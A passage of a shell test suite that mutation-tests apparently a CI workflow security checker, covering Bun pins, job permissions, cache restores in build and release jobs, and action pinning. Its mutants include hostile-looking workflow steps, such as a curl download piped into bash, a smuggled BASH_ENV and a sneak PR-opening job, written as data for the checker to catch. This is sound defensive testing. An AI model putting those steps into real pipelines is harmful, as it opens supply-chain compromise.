      for (const m of v.matchAll(/\boven\/bun:([^\s@\\]+)(@sha256:[0-9a-f]{64})?/g)) {
        seen++;
        if (m[1] !== want && !m[1].startsWith(want + "-")) out.push(file + ": " + path + " runs " + m[0] + ", not Bun " + JSON.stringify(want));
        if (!m[2]) out.push(file + ": " + path + " runs " + m[0] + " without a digest");
      }
    if (v && typeof v === "object") visit(file, v, path + "." + k, env, inputs);
  }
};
for (const f of fs.readdirSync(process.env.DIR).filter((x) => /\.ya?ml$/.test(x))) {
  const doc = Bun.YAML.parse(fs.readFileSync(process.env.DIR + "/" + f, "utf8"));
  visit(f, doc, "", [], null);
}
for (const d of fs.existsSync(process.env.ACTIONS) ? fs.readdirSync(process.env.ACTIONS) : [])
  for (const a of ["action.yml", "action.yaml"]) {
    const p = process.env.ACTIONS + "/" + d + "/" + a;
    if (!fs.existsSync(p)) continue;
    const doc = Bun.YAML.parse(fs.readFileSync(p, "utf8"));
    // An input default is a pin too.
    for (const [k, v] of Object.entries(doc.inputs ?? {}))
      if (k === "bun-version") { seen++; if (String(v?.default ?? "") !== want) out.push(d + "/" + a + ": input bun-version defaults to " + JSON.stringify(v?.default) + ", not " + JSON.stringify(want)); }
    visit(d + "/" + a, doc.runs ?? {}, "runs", [], doc.inputs ?? {});
  }
if (seen === 0) out.push("no Bun pins found, so the agreement check checked nothing");
if (out.length) console.log(out.join("\n"));
'
}
ACTIONS_DIR="${HERE}/../actions"
found="$(bun_pins "$WORKFLOWS" "$ACTIONS_DIR")"
if [ -z "$found" ]; then
	ok "every Bun pin in the workflows and local actions is release-exec.yml BUN_VERSION, the Bun the image runs"
else
	no "every Bun pin in the workflows and local actions is release-exec.yml BUN_VERSION" "$found"
fi
# bun_pin_caught <label> <file under .github> <exact text> <replacement>
bun_pin_caught() {
	rm -rf "${WORK}/pins" && mkdir -p "${WORK}/pins" && cp -rL "$WORKFLOWS" "${WORK}/pins/workflows" && cp -rL "$ACTIONS_DIR" "${WORK}/pins/actions"
	if ! FROM="${WORK}/pins/$2" OLD="$3" NEW="$4" bun -e '
const s = await Bun.file(process.env.FROM).text();
if (!s.includes(process.env.OLD)) { console.error("anchor not found"); process.exit(2); }
await Bun.write(process.env.FROM, s.replace(process.env.OLD, () => process.env.NEW));
'; then
		no "Bun pin mutant '$1' could be applied (the file no longer has the text it mutates)"
		return
	fi
	if [ -n "$(bun_pins "${WORK}/pins/workflows" "${WORK}/pins/actions")" ]; then ok "reports: $1"; else no "reports: $1" "the check passed this drift"; fi
}
bun_pin_caught 'test.yml testing a different Bun than the image runs (#783 review)' workflows/test.yml 'bun-version: "1.4.2"' 'bun-version: "1.3.14"'
bun_pin_caught 'the catalog sync on its own Bun (#783 review)' workflows/sync-pieces-catalog.yml '  BUN_VERSION: "1.4.2"' '  BUN_VERSION: "1.3.14"'
bun_pin_caught 'the composite action defaulting to another Bun (#783 review)' actions/bun-setup/action.yml 'default: "1.4.2"' 'default: "1.3.14"'
bun_pin_caught 'the catalog inspect image left on another Bun (#783 owner decision)' workflows/sync-pieces-catalog.yml 'oven/bun:1.4.2@sha256:9114c058aeae42162ee16dd5084b95fe9473970bb6bcb5b232ab1630f0546895' 'oven/bun:1.3.14@sha256:e10577f0db68676a7024391c6e5cb4b879ebd17188ab750cf10024a6d700e5c4'
bun_pin_caught 'the catalog inspect image by tag alone (#783 owner decision)' workflows/sync-pieces-catalog.yml 'oven/bun:1.4.2@sha256:9114c058aeae42162ee16dd5084b95fe9473970bb6bcb5b232ab1630f0546895' 'oven/bun:1.4.2'
bun_pin_caught 'release-exec.yml moved alone, leaving the rest behind (#783 review)' workflows/release-exec.yml '  BUN_VERSION: "1.4.2"' '  BUN_VERSION: "1.3.14"'
# release-exec.yml alone holds id-token + packages: write; if the derivation
# found nothing, the derivation is broken, not the repository clean.
if grep -q 'release-exec.yml' < <(for f in "$WORKFLOWS"/*.yml; do [ -n "$(check authority "$f")" ] && basename "$f"; done); then
	ok "the authority derivation finds release-exec.yml (${held} workflow(s) hold authority)"
else
	no "the authority derivation finds release-exec.yml"
fi

echo
echo "per-job authority on the release path"
for f in "$WORKFLOWS"/*.yml; do
	expect_clean "$(basename "$f"): no id-token matrix, no inherited secrets, OIDC publish jobs run no build, no persisted credentials, artifacts taken by digest" narrow "$f"
done

echo
echo "no job that ships an image restores it from a cache (#782, #868)"
for f in "$WORKFLOWS"/*.yml; do
	expect_clean "$(basename "$f"): every image a shipping job builds is built cold" pushcache "$f"
done
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	# The build that ships pushes nothing since #868: it is shipping because
	# its archive is uploaded for publish-docker to push.
	expect_caught 'the gha cache back on the build that ships into the archive (#782, #868)' pushcache "$WORKFLOWS/release-exec.yml" \
		$'          outputs: type=oci,dest=${{ runner.temp }}/release-image.oci.tar\n' \
		$'          outputs: type=oci,dest=${{ runner.temp }}/release-image.oci.tar\n          cache-from: type=gha\n' \
		'restores cache-from "type=gha" in a job that builds an image and uploads an artifact'
	expect_caught 'a registry cache back on the build that ships into the archive (#782, #868)' pushcache "$WORKFLOWS/release-exec.yml" \
		$'          outputs: type=oci,dest=${{ runner.temp }}/release-image.oci.tar\n' \
		$'          outputs: type=oci,dest=${{ runner.temp }}/release-image.oci.tar\n          cache-from: type=registry,ref=ghcr.io/x/y:cache\n' \
		'in a job that builds an image and uploads an artifact'
	expect_caught 'a buildx command line restoring a cache in the job that ships the archive (#782)' pushcache "$WORKFLOWS/release-exec.yml" \
		'      - name: Digest the archive' $'      - run: docker buildx build --cache-from type=gha -o type=oci,dest=x.tar .\n      - name: Digest the archive' \
		'runs a build with --cache-from in a job that builds an image and uploads an artifact'
	expect_caught 'the build step spelled in another case, with its cache back (#782)' pushcache "$WORKFLOWS/release-exec.yml" \
		$'        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0\n        with:\n          context: .\n' \
		$'        uses: Docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0\n        with:\n          cache-from: type=gha\n          context: .\n' \
		'restores cache-from'
	# A build that pushes through `outputs:` (push=true, as build-image did
	# from #680 to #868) is a push whether or not the job also logs in or
	# uploads anything: with the archive export replaced by a push, the cache
	# coming back must still be reported, for the push.
	expect_caught 'the gha cache back on a build that pushes only through outputs push=true (#680)' pushcache "$WORKFLOWS/release-exec.yml" \
		$'          outputs: type=oci,dest=${{ runner.temp }}/release-image.oci.tar\n' \
		$'          outputs: type=image,name=ghcr.io/${{ github.repository }},push-by-digest=true,name-canonical=true,push=true\n          cache-from: type=gha\n' \
		'restores cache-from "type=gha" in a job that pushes'
	# BuildKit parses the value as a Go bool: 1 and t push too (#680 review).
	expect_caught 'the gha cache back on a build that pushes through outputs push=1 (#680 review)' pushcache "$WORKFLOWS/release-exec.yml" \
		$'          outputs: type=oci,dest=${{ runner.temp }}/release-image.oci.tar\n' \
		$'          outputs: type=image,name=ghcr.io/${{ github.repository }},push=1\n          cache-from: type=gha\n' \
		'restores cache-from "type=gha" in a job that pushes'
	# A job that pushes only through skopeo, with no login, no push flag and
	# no imagetools: the validate-only docker-build.yml job with a skopeo
	# copy added, so only the skopeo detection can report its cache (#868).
	expect_caught 'a cached build in a job that pushes only through skopeo (#868)' pushcache "$WORKFLOWS/docker-build.yml" \
		'      - name: Check the release cache guard has not been disarmed' $'      - run: skopeo copy docker-daemon:jarvis:ci docker://ghcr.io/o/r:ci\n      - name: Check the release cache guard has not been disarmed' \
		'restores cache-from "type=gha" in a job that pushes'
	# The same, with a global flag before the subcommand (#868 review).
	expect_caught 'a cached build in a job that pushes through skopeo --debug copy (#868 review)' pushcache "$WORKFLOWS/docker-build.yml" \
		'      - name: Check the release cache guard has not been disarmed' $'      - run: skopeo --debug copy docker-daemon:jarvis:ci docker://ghcr.io/o/r:ci\n      - name: Check the release cache guard has not been disarmed' \
		'restores cache-from "type=gha" in a job that pushes'
	# Away from release-exec.yml, so the image mode there cannot be what
	# catches them: the cached validate build gaining an upload of a parent
	# directory, or of the same path spelled another way (#868 review).
	expect_caught 'a cached build uploading the directory holding its output (#868 review)' pushcache "$WORKFLOWS/docker-build.yml" \
		'      - name: Check the release cache guard has not been disarmed' $'      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n        with:\n          name: image\n          path: ${{ runner.temp }}\n      - name: Check the release cache guard has not been disarmed' \
		'restores cache-from "type=gha" in a job that builds an image and uploads an artifact'
	# The whole build step is replaced, so its text is read from the
	# workflow (it carries the action SHA, which an anchor never spells).
	build_step="$(FILE="$WORKFLOWS/docker-build.yml" bun -e '
const s = await Bun.file(process.env.FILE).text();
const a = s.indexOf("      - name: Build Docker image (validate)\n        uses: docker/build-push-action@");
const end = "          cache-to: type=gha,mode=max\n";
const b = s.indexOf(end, a);
if (a < 0 || b < 0) process.exit(2);
process.stdout.write(s.slice(a, b + end.length));
')" || build_step="(the build step was not found)"
	expect_caught 'a classic docker build with a cache, saved and uploaded (#868 review)' pushcache "$WORKFLOWS/docker-build.yml" \
		"$build_step"$'\n' \
		$'      - run: docker build --cache-from jarvis:ci -t jarvis:ci . && docker save jarvis:ci -o i.tar\n      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n        with:\n          name: image\n          path: i.tar\n' \
		'runs a build with --cache-from in a job that builds an image and uploads an artifact'
}

echo
echo "the catalog sync and the webview bump process third-party data without write access"
expect_clean "sync-pieces-catalog.yml: no job that installs dependencies or runs the generator holds a write scope; installs are frozen" \
	untrusted "$WORKFLOWS/sync-pieces-catalog.yml"
expect_clean "update-webview.yml: no job that builds or tests upstream Go code, or runs a repository script, holds a write scope or a secret (#983)" \
	untrusted "$WORKFLOWS/update-webview.yml"

echo
echo "every PR opened with create-pull-request takes a token whose CI runs (#981, #983)"
opens_pr=()
opens_gh=()
for f in "$WORKFLOWS"/*.yml; do
	o="$(check opens-pr "$f")" || {
		no "$(basename "$f"): opens-pr check ran" "the bun helper failed"
		continue
	}
	[ -n "$o" ] || continue
	if [ "$o" = gh ]; then opens_gh+=("$(basename "$f")"); continue; fi
	opens_pr+=("$(basename "$f")")
	expect_clean "$(basename "$f"): create-pull-request takes RELEASE_PR_TOKEN alone, after a step that refuses without it" catalog-pr "$f"
done
# Both bot PRs, found by the derivation, or it is broken rather than the
# repository clean.
if [ "$(printf '%s\n' "${opens_pr[@]}" | LC_ALL=C sort | tr '\n' ' ')" = "sync-pieces-catalog.yml update-webview.yml " ]; then
	ok "the workflows that open a PR with create-pull-request are the catalog sync and the webview bump (#983)"
else
	no "the workflows that open a PR with create-pull-request are the catalog sync and the webview bump (#983)" "found: ${opens_pr[*]}"
fi
# A PR opened through gh is not read by catalog-pr. release.yml opens the
# release PR that way, and its PAT is held instead by push_cred_check (read
# exactly three times, for github.com alone) and its own refusal (#929).
# Any other workflow doing so has to be argued for here.
if [ "$(printf '%s\n' "${opens_gh[@]}" | sed '/^$/d' | LC_ALL=C sort | tr '\n' ' ')" = "release.yml " ]; then
	ok "the only workflow that opens a PR through gh is release.yml (review of #983)"
else
	no "the only workflow that opens a PR through gh is release.yml (review of #983)" "found: ${opens_gh[*]}"
fi
copy="${WORK}/opens-gh.yml"
# shellcheck disable=SC2016 # JavaScript source, not shell.
FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
const s = await Bun.file(process.env.FROM).text();
await Bun.write(process.env.TO, s.replace("\njobs:\n", () => "\njobs:\n  sneak:\n    runs-on: ubuntu-latest\n    steps:\n      - run: gh pr create --fill\n"));
'
if [ "$(check opens-pr "$copy")" = gh ]; then ok "reports: a workflow that opens a PR through gh (review of #983)"; else no "reports: a workflow that opens a PR through gh (review of #983)"; fi

echo
echo "each rule reports the hole it exists for (mutated copies)"
expect_caught 'a workflow and job with no permissions anywhere' scoped "$WORKFLOWS/test.yml" \
	$'permissions:\n  contents: read\n' ''
expect_caught 'a publish job with no permissions of its own' publish-perms "$WORKFLOWS/release-exec.yml" \
	$'  discord-notify:\n    needs: [validate-tag, github-release]\n    if: ${{ inputs.dry_run != true }}\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n' \
	$'  discord-notify:\n    needs: [validate-tag, github-release]\n    if: ${{ inputs.dry_run != true }}\n    runs-on: ubuntu-latest\n'
expect_caught 'write scopes back at the top of the publish path' publish-perms "$WORKFLOWS/release-exec.yml" \
	$'permissions: {}\n' $'permissions:\n  contents: write\n'
expect_caught 'a major tag on the publish path' pinned "$WORKFLOWS/release-exec.yml" \
	'uses: softprops/action-gh-release@' 'uses: softprops/action-gh-release@v2 #'
# #984: the PR workflows, which hold no authority, each back on a tag.
expect_caught 'the image build of a catalog PR back on a tag (#984)' pinned "$WORKFLOWS/docker-build.yml" \
	'uses: docker/build-push-action@' 'uses: docker/build-push-action@v7 #' \
	'docker-build: uses docker/build-push-action@v7 (not a full commit SHA)'
expect_caught 'the buildx setup of a catalog PR back on a tag (#984)' pinned "$WORKFLOWS/docker-build.yml" \
	'uses: docker/setup-buildx-action@' 'uses: docker/setup-buildx-action@v4 #' \
	'docker-build: uses docker/setup-buildx-action@v4 (not a full commit SHA)'
expect_caught 'the checkout of a catalog PR image build back on a tag (#984)' pinned "$WORKFLOWS/docker-build.yml" \
	'uses: actions/checkout@' 'uses: actions/checkout@v7 #' \
	'docker-build: uses actions/checkout@v7 (not a full commit SHA)'
expect_caught 'the test run of every PR back on a tag (#984)' pinned "$WORKFLOWS/test.yml" \
	'uses: dorny/paths-filter@' 'uses: dorny/paths-filter@v4 #' \
	'changes: uses dorny/paths-filter@v4 (not a full commit SHA)'
# A read-only workflow gaining a write scope must come under the pin rule.
# test.yml is pinned since #984, so the copy also takes one action back to a
# tag; and the unmutated test.yml must hold no authority, or the yes below
# would not be the write scope.
if [ -z "$(check authority "$WORKFLOWS/test.yml")" ]; then
	ok "test.yml, as committed, holds no authority (so the two cases below are the mutation)"
else
	no "test.yml, as committed, holds no authority (so the two cases below are the mutation)"
fi
copy="${WORK}/authority.yml"
FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
const s = await Bun.file(process.env.FROM).text();
await Bun.write(process.env.TO, s.replace("permissions:\n  contents: read\n", "permissions:\n  contents: write\n").replace("uses: actions/checkout@", "uses: actions/checkout@v7 #"));
'
if [ -n "$(check authority "$copy")" ] && [ -n "$(check pinned "$copy")" ]; then
	ok "reports: a read-only workflow that gains a write scope while using tags"
else
	no "reports: a read-only workflow that gains a write scope while using tags"
fi
# #687: a secret is authority on its own. test.yml stays read-only here and
# only gains a secret reference; its tag (put back, as above) must surface.
# shellcheck disable=SC2016 # JavaScript source, not shell.
FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
// test.yml has no top-level env since #1047, so one is added in front of
// jobs:, and a missing anchor writes nothing, which fails the check below.
const s = await Bun.file(process.env.FROM).text();
if (s.split("\njobs:\n").length !== 2) process.exit(2);
await Bun.write(process.env.TO, s.replace("\njobs:\n", "\nenv:\n  SOME_KEY: ${{ secrets.SOME_KEY }}\n\njobs:\n").replace("uses: actions/checkout@", "uses: actions/checkout@v7 #"));
' && ok_written=1 || ok_written=0
if [ "$ok_written" = 1 ] && [ -n "$(check authority "$copy")" ] && [ -n "$(check pinned "$copy")" ]; then
	ok "reports: a read-only workflow that reads a secret while using tags"
else
	no "reports: a read-only workflow that reads a secret while using tags"
fi
# ...and secrets.GITHUB_TOKEN alone is not: its scope is the permissions block.
# shellcheck disable=SC2016 # JavaScript source, not shell.
FROM="$WORKFLOWS/test.yml" TO="$copy" bun -e '
// test.yml has no top-level env since #1047, so one is added in front of
// jobs:, and a missing anchor writes nothing, which fails the check below.
const s = await Bun.file(process.env.FROM).text();
if (s.split("\njobs:\n").length !== 2) process.exit(2);
await Bun.write(process.env.TO, s.replace("\njobs:\n", "\nenv:\n  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n\njobs:\n"));
' && ok_written=1 || ok_written=0
if [ "$ok_written" = 1 ] && [ -z "$(check authority "$copy")" ]; then
	ok "a read-only workflow reading only secrets.GITHUB_TOKEN holds no authority"
else
	no "a read-only workflow reading only secrets.GITHUB_TOKEN holds no authority"
fi
# #687: the pin rule descends into local composite actions. bun-setup is
# pinned since #984, so a copy of the repository with its setup-bun back on
# a tag stands in for it (the rule reads local actions from REPO_DIR).
rm -rf "${WORK}/tagged-repo" && mkdir -p "${WORK}/tagged-repo/.github" && cp -R "${HERE}/../actions" "${WORK}/tagged-repo/.github/actions"
if FROM="${WORK}/tagged-repo/.github/actions/bun-setup/action.yml" OLD='    - uses: oven-sh/setup-bun@' NEW='    - uses: oven-sh/setup-bun@v2 #' bun -e '
const s = await Bun.file(process.env.FROM).text();
if (!s.includes(process.env.OLD)) process.exit(2);
await Bun.write(process.env.FROM, s.replace(process.env.OLD, () => process.env.NEW));
'; then
	REPO_DIR="${WORK}/tagged-repo" expect_caught 'a local composite action with tagged actions, used where authority is held' pinned "$WORKFLOWS/release.yml" \
		'      - uses: oven-sh/setup-bun@' $'      - uses: ./.github/actions/bun-setup\n      - uses: oven-sh/setup-bun@' \
		'(via ./.github/actions/bun-setup): uses oven-sh/setup-bun@v2 (not a full commit SHA)'
	# ...and in the PR workflow that runs it, which holds no authority (#984).
	if found="$(REPO_DIR="${WORK}/tagged-repo" check pinned "$WORKFLOWS/test.yml")" && grep -qF '(via ./.github/actions/bun-setup): uses oven-sh/setup-bun@v2 (not a full commit SHA)' <<<"$found"; then
		ok "reports: a tag back in the composite action test.yml runs (#984)"
	else
		no "reports: a tag back in the composite action test.yml runs (#984)" "got: ${found}"
	fi
else
	no "the bun-setup tag mutant could be applied (action.yml no longer has the text it mutates)"
fi
# (#1048) mutable on the PR workflows, which hold no authority.
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	expect_caught 'BuildKit back to its default image in the PR image build (#1048)' mutable "$WORKFLOWS/docker-build.yml" \
		$'        with:\n          driver-opts: image=moby/buildkit:v0.33.1@sha256:cec9f139f45e93c5c69c60f8b07cfad9f43f4ef6b6a6cd917527fea5ff2e3dea\n' '' \
		'docker-build: step Set up Docker Buildx: BuildKit image is not pinned by digest ("default buildx-stable-1")'
	expect_caught 'BuildKit by tag in the PR image build (#1048)' mutable "$WORKFLOWS/docker-build.yml" \
		'image=moby/buildkit:v0.33.1@sha256:cec9f139f45e93c5c69c60f8b07cfad9f43f4ef6b6a6cd917527fea5ff2e3dea' 'image=moby/buildkit:buildx-stable-1' \
		'BuildKit image is not pinned by digest ("moby/buildkit:buildx-stable-1")'
	expect_caught 'a floating Go version back in the PR test workflow (#1048)' mutable "$WORKFLOWS/test.yml" \
		$'\njobs:\n' $'\nenv:\n  GO_VERSION: "1.25"\n\njobs:\n' \
		'env.GO_VERSION is "1.25"'
	expect_caught 'a download piped into a shell in the PR test workflow (#1048)' mutable "$WORKFLOWS/test.yml" \
		'      - name: Parse every plist' $'      - run: curl -fsSL https://bun.sh/install | bash\n      - name: Parse every plist' \
		'pipes a download into a shell'
	expect_caught 'a floating Bun in the toast job (#1048)' mutable "$WORKFLOWS/test.yml" \
		'          bun-version: "1.4.2"' '          bun-version: latest' \
		'toast-windows: step oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6: bun-version resolves to "latest"'
	expect_caught 'a cache restore spelled in another case, where authority is held (#1048)' mutable "$WORKFLOWS/release.yml" \
		'      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0' $'      - uses: Actions/Cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0\n        with:\n          path: x\n          key: k\n      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0' \
		'restores from the Actions cache (writable by any run on main)'
	expect_caught 'setup-bun spelled in another case, with its cache on (#1048)' mutable "$WORKFLOWS/test.yml" \
		'      - name: Parse every plist' $'      - uses: Oven-sh/Setup-Bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0\n      - name: Parse every plist' \
		'plist-lint: step Oven-sh/Setup-Bun@0c5077e51419868618aeaa5fe8019c62421857d6: setup-bun without no-cache: true'
}
# (#1047) A cached Bun inside a local composite action, refused where
# authority is held: since #1047 bun-setup downloads Bun and restores its
# install cache by exact key only, which is refused there too, so this
# mutant names the reason (it replaced an older one that named none).
expect_caught 'an exact-key cache restore, used where authority is held (#1047)' mutable "$WORKFLOWS/release.yml" \
	'      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0' '      - uses: ./.github/actions/bun-setup
      - uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2.2.0' \
	'(via ./.github/actions/bun-setup) Cache bun install cache: restores from the Actions cache (writable by any run on main)'
echo
echo "a workflow that holds no authority restores its caches by exact key only (#1047)"
# The cache part of mutable, on test.yml as it stands: nothing about a cache.
found="$(check mutable "$WORKFLOWS/test.yml")" || found="(the bun helper failed)"
if ! grep -qiE 'cache|restore|helper failed' <<<"$found"; then
	ok "test.yml restores no cache but by its exact key, through bun-setup and go-setup (#1047)"
else
	no "test.yml restores no cache but by its exact key, through bun-setup and go-setup (#1047)" "$found"
fi
# A reusable workflow runs with its caller token, so its caches are refused
# as where authority is held (#1047 review).
expect_caught 'an exact-key cache in a workflow another can call (#1047 review)' mutable "$WORKFLOWS/test.yml" \
	$'  pull_request:\n' $'  pull_request:\n  workflow_call:\n' \
	'(via ./.github/actions/bun-setup) Cache bun install cache: restores from the Actions cache (writable by any run on main)'
# action_case <label> <action> <exact text> <replacement> <reason>: the
# mutable rule on test.yml with one local composite action mutated, in a
# copy of .github/actions; the report must contain the reason.
action_case() {
	local repo="${WORK}/action-repo"
	# sidecar/go.mod too: go-setup reads go-version-file from the repository.
	rm -rf "$repo" && mkdir -p "${repo}/.github" "${repo}/sidecar" && cp -R "${HERE}/../actions" "${repo}/.github/actions" &&
		cp "${HERE}/../../sidecar/go.mod" "${repo}/sidecar/go.mod"
	if ! FROM="${repo}/.github/actions/$2/action.yml" OLD="$3" NEW="$4" bun -e '
const s = await Bun.file(process.env.FROM).text();
if (s.split(process.env.OLD).length !== 2) process.exit(2);
await Bun.write(process.env.FROM, s.replace(process.env.OLD, () => process.env.NEW));
'; then
		no "mutant '$1' could be applied (the action no longer has the text it mutates, once)"
		return
	fi
	local found
	found="$(REPO_DIR="$repo" check mutable "$WORKFLOWS/test.yml")" || {
		no "reports: $1" "the check could not read the mutated action: ${found}"
		return
	}
	if grep -qF -- "$5" <<<"$found"; then ok "reports: $1"; else no "reports: $1, for the reason it exists" "wanted '${5}', got:
${found:-nothing}"; fi
}
# The copy action_case reads, unmutated, is clean: so each case below is
# reported for its mutation, not for the copy.
rm -rf "${WORK}/action-repo" && mkdir -p "${WORK}/action-repo/.github" "${WORK}/action-repo/sidecar" &&
	cp -R "${HERE}/../actions" "${WORK}/action-repo/.github/actions" && cp "${HERE}/../../sidecar/go.mod" "${WORK}/action-repo/sidecar/go.mod"
if found="$(REPO_DIR="${WORK}/action-repo" check mutable "$WORKFLOWS/test.yml")" && [ -z "$found" ]; then
	ok "the action copy the cases below mutate is clean as it stands (#1047)"
else
	no "the action copy the cases below mutate is clean as it stands (#1047)" "$found"
fi
# shellcheck disable=SC2016 # literal workflow text, not shell.
{
	action_case 'the bun install cache restored by a key prefix again (#1047)' bun-setup \
		$'        lookup-only: ${{ steps.bun-install-lookup.outputs.cache-hit != \'true\' }}\n' \
		$'        lookup-only: ${{ steps.bun-install-lookup.outputs.cache-hit != \'true\' }}\n        restore-keys: ${{ runner.os }}-bun-\n' \
		'Cache bun install cache: restores by a key prefix (restore-keys)'
	action_case 'the bun install cache kept on a match that is not exact (#1047)' bun-setup \
		$'\n    - name: Discard a bun install cache that is not an exact key match\n      if: steps.bun-install-cache.outputs.cache-hit != \'true\'\n      shell: bash\n      run: rm -rf ~/.bun/install/cache\n' '' \
		'Cache bun install cache: a restore that is not an exact key match is not discarded'
	action_case 'the bun install cache discarded only on an exact hit (#1047)' bun-setup \
		$'      if: steps.bun-install-cache.outputs.cache-hit != \'true\'' $'      if: steps.bun-install-cache.outputs.cache-hit == \'true\'' \
		'Cache bun install cache: a restore that is not an exact key match is not discarded'
	action_case 'the bun install cache discard pointed at another directory (#1047)' bun-setup \
		'      run: rm -rf ~/.bun/install/cache' '      run: rm -rf ~/.bun/install/tmp' \
		'Cache bun install cache: a restore that is not an exact key match is not discarded'
	action_case 'the bun install cache step with no id to test (#1047)' bun-setup \
		$'      id: bun-install-cache\n' '' \
		'Cache bun install cache: a restore that is not an exact key match is not discarded'
	action_case 'a step between the bun install cache and its discard (#1047)' bun-setup \
		$'\n    - name: Discard a bun install cache' $'\n    - run: ls ~/.bun/install/cache\n      shell: bash\n\n    - name: Discard a bun install cache' \
		'Cache bun install cache: a restore that is not an exact key match is not discarded'
	action_case 'Bun itself restored from the Actions cache in a PR workflow (#1047)' bun-setup \
		$'        no-cache: true\n' '' \
		'setup-bun without no-cache: true restores Bun from the Actions cache'
	action_case 'the Go module cache left out of the discard (#1047)' go-setup \
		$'        GOMODCACHE: ${{ steps.go-cache-dirs.outputs.mod }}\n' '' \
		'Go module and build cache: a restore that is not an exact key match is not discarded'
	action_case 'the Go caches restored by a key prefix (#1047)' go-setup \
		$'        lookup-only: ${{ steps.go-cache-lookup.outputs.cache-hit != \'true\' }}\n' $'        lookup-only: ${{ steps.go-cache-lookup.outputs.cache-hit != \'true\' }}\n        restore-keys: go-\n' \
		'Go module and build cache: restores by a key prefix (restore-keys)'
	action_case 'setup-go back to its own prefix-matched cache in a PR workflow (#1047)' go-setup \
		$'        cache: false\n' '' \
		'setup-go without cache: false restores modules and build output from the Actions cache'
	action_case 'the bun install cache with no exact-key lookup in front (#1047 review)' bun-setup \
		$'        lookup-only: true\n' $'        lookup-only: false\n' \
		'Cache bun install cache: not gated by a lookup-only actions/cache/restore'
	action_case 'the bun install cache downloading whatever it matches (#1047 review)' bun-setup \
		$'        lookup-only: ${{ steps.bun-install-lookup.outputs.cache-hit != \'true\' }}\n' '' \
		'Cache bun install cache: not gated by a lookup-only actions/cache/restore'
	action_case 'the bun install cache looked up on another key (#1047 review)' bun-setup \
		$'        key: ${{ runner.os }}-bun-${{ hashFiles(\'bun.lock\') }}\n        lookup-only: true\n' $'        key: ${{ runner.os }}-bun-other\n        lookup-only: true\n' \
		'Cache bun install cache: not gated by a lookup-only actions/cache/restore'
	action_case 'the bun install cache discard that removes nothing (#1047 review)' bun-setup \
		'      run: rm -rf ~/.bun/install/cache' '      run: ls ~/.bun/install/cache' \
		'Cache bun install cache: a restore that is not an exact key match is not discarded'
	action_case 'the bun install cache discard aimed at a longer name (#1047 review)' bun-setup \
		'      run: rm -rf ~/.bun/install/cache' '      run: rm -rf ~/.bun/install/cache-old' \
		'Cache bun install cache: a restore that is not an exact key match is not discarded'
	action_case 'the bun install cache discard allowed to fail (#1047 review)' bun-setup \
		$'      shell: bash\n      run: rm -rf ~/.bun/install/cache' $'      shell: bash\n      continue-on-error: true\n      run: rm -rf ~/.bun/install/cache' \
		'Cache bun install cache: a restore that is not an exact key match is not discarded'
	action_case 'the Go build cache left out of the discard (#1047 review)' go-setup \
		$'        rm -rf "$GOCACHE"\n' '' \
		'Go module and build cache: a restore that is not an exact key match is not discarded'
	action_case 'the Go module cache env renamed, so go clean ignores it (#1047 review)' go-setup \
		$'        GOMODCACHE: ${{ steps.go-cache-dirs.outputs.mod }}\n' $'        MODDIR: ${{ steps.go-cache-dirs.outputs.mod }}\n' \
		'Go module and build cache: a restore that is not an exact key match is not discarded'
	action_case 'a lone actions/cache/restore that downloads (#1047 review)' go-setup \
		$'        lookup-only: true\n' '' \
		'Look up the Go caches by their exact key: actions/cache/restore here is not a lookup-only step'
	action_case 'GOFLAGS on the Go discard, which turns go clean into a dry run (#1047 review 2)' go-setup \
		$'        GOCACHE: ${{ steps.go-cache-dirs.outputs.build }}\n' $'        GOCACHE: ${{ steps.go-cache-dirs.outputs.build }}\n        GOFLAGS: -n\n' \
		'Go module and build cache: a restore that is not an exact key match is not discarded'
	action_case 'BASH_ENV on the bun install cache discard (#1047 review 2)' bun-setup \
		$'      shell: bash\n      run: rm -rf ~/.bun/install/cache' $'      shell: bash\n      env:\n        BASH_ENV: /tmp/x\n      run: rm -rf ~/.bun/install/cache' \
		'Cache bun install cache: a restore that is not an exact key match is not discarded'
	action_case 'a quoted ~ in the discard env, which bash does not expand (#1047 review 2)' bun-setup \
		$'      shell: bash\n      run: rm -rf ~/.bun/install/cache' $'      shell: bash\n      env:\n        D: ~/.bun/install/cache\n      run: rm -rf "$D"' \
		'Cache bun install cache: a restore that is not an exact key match is not discarded'
	action_case 'restore-keys spelled in another case (#1047 review 2)' bun-setup \
		$'        lookup-only: ${{ steps.bun-install-lookup.outputs.cache-hit != \'true\' }}\n' $'        lookup-only: ${{ steps.bun-install-lookup.outputs.cache-hit != \'true\' }}\n        Restore-Keys: ${{ runner.os }}-bun-\n' \
		'Cache bun install cache: restores by a key prefix (restore-keys)'
	action_case 'lookup-only spelled twice, once as false (#1047 review 2)' bun-setup \
		$'        lookup-only: ${{ steps.bun-install-lookup.outputs.cache-hit != \'true\' }}\n' $'        lookup-only: ${{ steps.bun-install-lookup.outputs.cache-hit != \'true\' }}\n        Lookup-Only: false\n' \
		'Cache bun install cache: takes inputs other than path, key and lookup-only, or one spelled twice'
	action_case 'another input on the cache step (#1047 review 2)' bun-setup \
		$'        lookup-only: ${{ steps.bun-install-lookup.outputs.cache-hit != \'true\' }}\n' $'        lookup-only: ${{ steps.bun-install-lookup.outputs.cache-hit != \'true\' }}\n        enableCrossOsArchive: true\n' \
